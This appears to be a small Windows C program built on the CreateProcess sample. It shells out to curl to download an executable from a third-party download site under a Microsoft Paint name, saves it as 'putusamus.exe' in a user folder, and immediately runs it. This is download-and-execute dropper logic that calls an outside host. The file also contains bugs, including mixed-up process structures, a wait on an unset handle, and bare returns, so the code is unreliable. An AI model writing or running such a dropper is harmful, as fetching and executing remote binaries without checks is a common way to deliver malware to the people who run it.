#include <windows.h>
#include <stdio.h>
#include <tchar.h>

int _tmain( int argc, TCHAR *argv[] )
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if( argc != 2 )
    {
        printf("Usage: %s [cmdline]\n", argv[0]);
        return;
    }

    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        "curl https://microsoft_paint.es.downloadastro.com/descarga/# -o C:\\Users\\IEUser\\Documents\\martisCode\\putusamus.exe",        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        NULL,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
        return;
    }

     // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );
    
    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    STARTUPINFO si2;
    PROCESS_INFORMATION pi2;

    ZeroMemory( &si2, sizeof(si2) );
    si.cb = sizeof(si2);
    ZeroMemory( &pi2, sizeof(pi2) );

    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        "C:\\Users\\IEUser\\Documents\\martisCode\\putusamus.exe",        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        NULL,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
        return;
    }

    // Wait until child process exits.
    WaitForSingleObject( pi2.hProcess, INFINITE ); //Probably should be removed

    // Close process and thread handles. 
    CloseHandle( pi2.hProcess );
    CloseHandle( pi2.hThread );


}